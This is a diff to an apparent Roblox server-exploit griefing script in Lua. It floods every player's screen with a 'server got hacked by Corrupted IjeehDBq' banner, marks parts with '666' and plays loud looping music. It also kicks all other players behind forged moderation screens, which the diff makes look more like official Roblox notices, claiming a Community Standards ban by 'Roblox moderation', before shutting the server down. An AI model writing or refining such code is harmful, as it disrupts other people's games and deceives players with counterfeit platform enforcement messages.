@@ -89,24 +89,75 @@ end)
 -- Day/Night cycle control
 local dayNightLoop = nil
 
--- HINT - Just Workspace Hint with Loop (Visible to Everyone)
-local function showHintToAll()
-    -- Create workspace hint visible to everyone
-    local h = Instance.new("Hint", workspace)
-    h.Text = "😈The server got hacked by Corrupted IjeehDBq😈"
+-- Function to create hint GUI on ANY player's screen
+local function createHintOnPlayer(plr)
+    -- Create ScreenGui for this player
+    local hintGui = Instance.new("ScreenGui")
+    hintGui.Name = "HackHint"
+    hintGui.ResetOnSpawn = false
+    hintGui.Parent = plr:WaitForChild("PlayerGui")
     
-    -- Loop to keep showing hint
+    -- Create hint frame
+    local hintFrame = Instance.new("Frame", hintGui)
+    hintFrame.Size = UDim2.new(0, 600, 0, 80)
+    hintFrame.Position = UDim2.new(0.5, -300, 0.1, 0)
+    hintFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    hintFrame.BackgroundTransparency = 0.2
+    hintFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+    hintFrame.BorderSizePixel = 3
+    hintFrame.ZIndex = 999
+    
+    -- Add corner rounding
+    local corner = Instance.new("UICorner", hintFrame)
+    corner.CornerRadius = UDim.new(0, 10)
+    
+    -- Add glow effect
+    local stroke = Instance.new("UIStroke", hintFrame)
+    stroke.Color = Color3.fromRGB(255, 0, 0)
+    stroke.Thickness = 3
+    
+    -- Create hint text
+    local hintText = Instance.new("TextLabel", hintFrame)
+    hintText.Size = UDim2.new(1, 0, 1, 0)
+    hintText.BackgroundTransparency = 1
+    hintText.Text = "😈the server got hacked by Corrupted IjeehDBq😈"
+    hintText.TextColor3 = Color3.fromRGB(255, 0, 0)
+    hintText.TextSize = 24
+    hintText.Font = Enum.Font.SourceSansBold
+    hintText.TextWrapped = true
+    hintText.ZIndex = 1000
+    
+    -- Keep hint visible (looping - stays on screen)
+    -- Hint stays visible permanently on their screen
+end
+
+-- HINT - Looping on ALL Players' Screens (Visible to Everyone)
+local function showHintToAll()
+    -- Create hint GUI for EVERY player currently in game
+    for _, plr in pairs(Players:GetPlayers()) do
+        createHintOnPlayer(plr)
+    end
+    
+    -- Also create workspace hint (visible in game world)
+    local h = Instance.new("Hint", workspace)
+    h.Text = "😈the server got hacked by Corrupted IjeehDBq😈"
+    Debris:AddItem(h, 5)
+    
+    -- Loop workspace hints forever
     spawn(function()
         while true do
-            wait(5)
+            wait(3)
             local h2 = Instance.new("Hint", workspace)
-            h2.Text = "😈The server got hacked by Corrupted IjeehDBq😈"
+            h2.Text = "😈the server got hacked by Corrupted IjeehDBq😈"
             Debris:AddItem(h2, 5)
         end
     end)
     
-    -- Clean up initial hint after 5 seconds
-    Debris:AddItem(h, 5)
+    -- Also handle new players joining (they get the hint too)
+    Players.PlayerAdded:Connect(function(plr)
+        wait(2) -- Wait for PlayerGui
+        createHintOnPlayer(plr)
+    end)
 end
 
 -- HACK - Fire Effects Visible to ALL Players including YOU
@@ -125,7 +176,7 @@ local function hackAllParts()
     
     for _, v in pairs(workspace:GetDescendants()) do
         if v:IsA("BasePart") and not v:FindFirstChild("666") then
-            -- Billboard GUI (visible to everyone)
+            -- Billboard GUI (visible to everyone on their screens)
             local bbg = Instance.new("BillboardGui", v)
             bbg.Name = "stuf"
             bbg.Adornee = v
@@ -133,7 +184,7 @@ local function hackAllParts()
             bbg.AlwaysOnTop = true
             
             local tlb = Instance.new("TextLabel", bbg)
-            tlb.Text = ""
+            tlb.Text = "666 666 666 666 666 666"
             tlb.Font = "SourceSansBold"
             tlb.TextColor3 = Color3.new(1, 0, 0)
             tlb.Size = UDim2.new(1.25, 0, 1.25, 0)
@@ -194,7 +245,7 @@ local function playMusic2()
     if not workspace:FindFirstChild("Music2") then
         local Music2 = Instance.new("Sound", workspace)
         Music2.Name = "Music2"
-        Music2.SoundId = "rbxassetid://1847661821"
+        Music2.SoundId = "rbxassetid://1835925883"
         Music2.Looped = true
         Music2.Volume = 10
         Music2:Play()
@@ -236,11 +287,11 @@ local function firestorm()
     end
 end
 
--- Function to create disconnect UI for ANY player (including me)
-local function createDisconnectUI(plr)
-    -- Create realistic disconnect screen
+-- Function to create Roblox Moderation-style disconnect UI for ANY player (including me)
+local function createModerationDisconnectUI(plr)
+    -- Create realistic Roblox moderation disconnect screen
     local shutdownGui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
-    shutdownGui.Name = "Disconnect"
+    shutdownGui.Name = "RobloxModeration"
     shutdownGui.ResetOnSpawn = false
     
     -- Blur effect (causes visual lag)
@@ -257,47 +308,61 @@ local function createDisconnectUI(plr)
         lagFrame.ZIndex = i
     end
     
-    -- Modern disconnect frame
+    -- Roblox moderation-style frame (clean, official look)
     local frame = Instance.new("Frame", shutdownGui)
-    frame.Size = UDim2.new(0, 450, 0, 280)
-    frame.Position = UDim2.new(0.5, -225, 0.5, -140)
-    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    frame.Size = UDim2.new(0, 500, 0, 320)
+    frame.Position = UDim2.new(0.5, -250, 0.5, -160)
+    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
     frame.BorderSizePixel = 0
     frame.ZIndex = 10
     
     -- Add corner rounding
     local corner = Instance.new("UICorner", frame)
-    corner.CornerRadius = UDim.new(0, 15)
+    corner.CornerRadius = UDim.new(0, 12)
     
-    -- Add stroke
+    -- Add stroke (Roblox blue border)
     local stroke = Instance.new("UIStroke", frame)
-    stroke.Color = Color3.fromRGB(255, 0, 0)
+    stroke.Color = Color3.fromRGB(0, 162, 255)
     stroke.Thickness = 2
     
+    -- Roblox logo text
+    local robloxLogo = Instance.new("TextLabel", frame)
+    robloxLogo.Size = UDim2.new(1, 0, 0, 40)
+    robloxLogo.Position = UDim2.new(0, 0, 0, 10)
+    robloxLogo.BackgroundTransparency = 1
+    robloxLogo.Text = "ROBLOX"
+    robloxLogo.Font = Enum.Font.SourceSansBold
+    robloxLogo.TextSize = 24
+    robloxLogo.TextColor3 = Color3.fromRGB(0, 162, 255)
+    robloxLogo.ZIndex = 11
+    
+    -- Title
     local title = Instance.new("TextLabel", frame)
     title.Size = UDim2.new(1, 0, 0, 50)
+    title.Position = UDim2.new(0, 0, 0, 50)
     title.BackgroundTransparency = 1
-    title.Text = "DISCONNECTED"
+    title.Text = "Disconnected"
     title.Font = Enum.Font.SourceSansBold
     title.TextSize = 28
-    title.TextColor3 = Color3.fromRGB(255, 0, 0)
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.ZIndex = 11
     
+    -- Error message
     local msg = Instance.new("TextLabel", frame)
     msg.Size = UDim2.new(1, -40, 0, 100)
-    msg.Position = UDim2.new(0, 20, 0, 60)
+    msg.Position = UDim2.new(0, 20, 0, 100)
     msg.BackgroundTransparency = 1
-    msg.Text = "Lost connection to the game server, please reconnect\n\nError Code: 1001"
+    msg.Text = "You have been disconnected from the game.\n\nError Code: 1001\n\nThis action was taken by Roblox moderation."
     msg.Font = Enum.Font.SourceSans
     msg.TextSize = 18
-    msg.TextColor3 = Color3.new(1, 1, 1)
+    msg.TextColor3 = Color3.fromRGB(200, 200, 200)
     msg.TextWrapped = true
     msg.ZIndex = 11
     
     -- Date and time like Roblox moderation
     local dateLabel = Instance.new("TextLabel", frame)
     dateLabel.Size = UDim2.new(1, 0, 0, 30)
-    dateLabel.Position = UDim2.new(0, 0, 0, 180)
+    dateLabel.Position = UDim2.new(0, 0, 0, 210)
     dateLabel.BackgroundTransparency = 1
     dateLabel.Text = "Date: " .. os.date("%m/%d/%Y") .. " Time: " .. os.date("%H:%M:%S")
     dateLabel.Font = Enum.Font.Code
@@ -305,10 +370,10 @@ local function createDisconnectUI(plr)
     dateLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
     dateLabel.ZIndex = 11
     
-    -- Loading bar
+    -- Loading bar (like Roblox reconnecting)
     local loadingBar = Instance.new("Frame", frame)
-    loadingBar.Size = UDim2.new(0, 350, 0, 6)
-    loadingBar.Position = UDim2.new(0.5, -175, 0, 230)
+    loadingBar.Size = UDim2.new(0, 400, 0, 6)
+    loadingBar.Position = UDim2.new(0.5, -200, 0, 260)
     loadingBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
     loadingBar.BorderSizePixel = 0
     loadingBar.ZIndex = 11
@@ -318,7 +383,7 @@ local function createDisconnectUI(plr)
     
     local loadingFill = Instance.new("Frame", loadingBar)
     loadingFill.Size = UDim2.new(0, 0, 1, 0)
-    loadingFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    loadingFill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
     loadingFill.BorderSizePixel = 0
     loadingFill.ZIndex = 12
     
@@ -327,7 +392,7 @@ local function createDisconnectUI(plr)
     
     -- Animate loading bar
     spawn(function()
-        for i = 0, 350, 5 do
+        for i = 0, 400, 5 do
             loadingFill.Size = UDim2.new(0, i, 1, 0)
             wait(0.05)
         end
@@ -348,7 +413,7 @@ local function createDisconnectUI(plr)
     end
 end
 
--- SHUTDOWN - Blur + Error Code 1001 + Disappear + Freeze for ALL including YOU
+-- SHUTDOWN - Roblox Moderation Disconnect (Error 1001) for ALL including YOU
 local function shutdownServer()
     for _, plr in pairs(Players:GetPlayers()) do
         -- Create lag effect first for EVERYONE
@@ -360,20 +425,20 @@ local function shutdownServer()
             end
         end
         
-        -- Create disconnect UI for everyone including me
-        createDisconnectUI(plr)
+        -- Create Roblox moderation disconnect UI for everyone including me
+        createModerationDisconnectUI(plr)
         
         wait(3)
-        plr:Kick("Disconnected: Lost connection to the game server (Error Code: 1001)")
+        plr:Kick("Disconnected: Error Code 1001 - Roblox Moderation")
     end
     game:Shutdown()
 end
 
--- Function to create ban UI for OTHER players (NOT me)
-local function createBanUI(plr)
-    -- Create ban screen
+-- Function to create Roblox Moderation-style ban UI for OTHER players (NOT me)
+local function createModerationBanUI(plr)
+    -- Create realistic Roblox moderation ban screen
     local banGui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
-    banGui.Name = "BanScreen"
+    banGui.Name = "RobloxModerationBan"
     banGui.ResetOnSpawn = false
     
     -- Blur effect (causes visual lag)
@@ -390,53 +455,58 @@ local function createBanUI(plr)
         lagFrame.ZIndex = i
     end
     
-    -- Modern ban frame
+    -- Roblox moderation-style ban frame (clean, official look)
     local frame = Instance.new("Frame", banGui)
-    frame.Size = UDim2.new(0, 550, 0, 380)
-    frame.Position = UDim2.new(0.5, -275, 0.5, -190)
-    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    frame.Size = UDim2.new(0, 550, 0, 400)
+    frame.Position = UDim2.new(0.5, -275, 0.5, -200)
+    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
     frame.BorderSizePixel = 0
     frame.ZIndex = 10
     
     -- Add corner rounding
     local corner = Instance.new("UICorner", frame)
-    corner.CornerRadius = UDim.new(0, 15)
+    corner.CornerRadius = UDim.new(0, 12)
     
-    -- Add stroke
+    -- Add stroke (Roblox red border for ban)
     local stroke = Instance.new("UIStroke", frame)
     stroke.Color = Color3.fromRGB(255, 0, 0)
-    stroke.Thickness = 3
+    stroke.Thickness = 2
     
+    -- Roblox logo text
+    local robloxLogo = Instance.new("TextLabel", frame)
+    robloxLogo.Size = UDim2.new(1, 0, 0, 40)
+    robloxLogo.Position = UDim2.new(0, 0, 0, 10)
+    robloxLogo.BackgroundTransparency = 1
+    robloxLogo.Text = "ROBLOX"
+    robloxLogo.Font = Enum.Font.SourceSansBold
+    robloxLogo.TextSize = 24
+    robloxLogo.TextColor3 = Color3.fromRGB(0, 162, 255)
+    robloxLogo.ZIndex = 11
+    
+    -- Title
     local title = Instance.new("TextLabel", frame)
-    title.Size = UDim2.new(1, 0, 0, 70)
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Position = UDim2.new(0, 0, 0, 50)
     title.BackgroundTransparency = 1
-    title.Text = "BANNED"
+    title.Text = "Account Banned"
     title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 36
+    title.TextSize = 30
     title.TextColor3 = Color3.fromRGB(255, 0, 0)
     title.ZIndex = 11
     
-    local hacked = Instance.new("TextLabel", frame)
-    hacked.Size = UDim2.new(1, 0, 0, 30)
-    hacked.Position = UDim2.new(0, 0, 0, 65)
-    hacked.BackgroundTransparency = 1
-    hacked.Text = "Hacked by Corrupted IjeehDBq"
-    hacked.Font = Enum.Font.SourceSansBold
-    hacked.TextSize = 18
-    hacked.TextColor3 = Color3.fromRGB(255, 255, 0)
-    hacked.ZIndex = 11
+    -- Ban message
+    local msg = Instance.new("TextLabel", frame)
+    msg.Size = UDim2.new(1, -40, 0, 120)
+    msg.Position = UDim2.new(0, 20, 0, 100)
+    msg.BackgroundTransparency = 1
+    msg.Text = "Your account has been banned for violating\nRoblox Community Standards.\n\nError Code: 3003\n\nReason: Hacking/Exploiting\nModerator: Corrupted IjeehDBq"
+    msg.Font = Enum.Font.SourceSans
+    msg.TextSize = 18
+    msg.TextColor3 = Color3.fromRGB(200, 200, 200)
+    msg.TextWrapped = true
+    msg.ZIndex = 11
     
-    local reason = Instance.new("TextLabel", frame)
-    reason.Size = UDim2.new(1, -40, 0, 100)
-    reason.Position = UDim2.new(0, 20, 0, 100)
-    reason.BackgroundTransparency = 1
-    reason.Text = "You have been banned from this game\nby Corrupted IjeehDBq\n\nReason: Hacking/Exploiting\nError Code: 1001"
-    reason.Font = Enum.Font.SourceSans
-    reason.TextSize = 20
-    reason.TextColor3 = Color3.new(1, 1, 1)
-    reason.TextWrapped = true
-    reason.ZIndex = 11
-    
+    -- Ban ID
     local banId = Instance.new("TextLabel", frame)
     banId.Size = UDim2.new(1, 0, 0, 30)
     banId.Position = UDim2.new(0, 0, 0, 230)
@@ -447,6 +517,7 @@ local function createBanUI(plr)
     banId.TextColor3 = Color3.fromRGB(255, 255, 0)
     banId.ZIndex = 11
     
+    -- Date
     local date = Instance.new("TextLabel", frame)
     date.Size = UDim2.new(1, 0, 0, 30)
     date.Position = UDim2.new(0, 0, 0, 270)
@@ -500,7 +571,7 @@ local function createBanUI(plr)
     end
 end
 
--- BAN ALL - Blur + Error Code 1001 + Disappear + Real Ban for OTHERS ONLY (NOT me)
+-- BAN ALL - Roblox Moderation Ban (Error 3003) for OTHERS ONLY (NOT me)
 local function banAllPlayers()
     for _, plr in pairs(Players:GetPlayers()) do
         if plr ~= me then  -- SKIP ME! I stay safe
@@ -513,11 +584,11 @@ local function banAllPlayers()
                 end
             end
             
-            -- Create ban UI for other players
-            createBanUI(plr)
+            -- Create Roblox moderation ban UI for other players
+            createModerationBanUI(plr)
             
             wait(3)
-            plr:Kick("Banned: You have been banned by Corrupted IjeehDBq (Error Code: 1001)")
+            plr:Kick("Banned: Error Code 3003 - Roblox Moderation")
         end
     end
 end
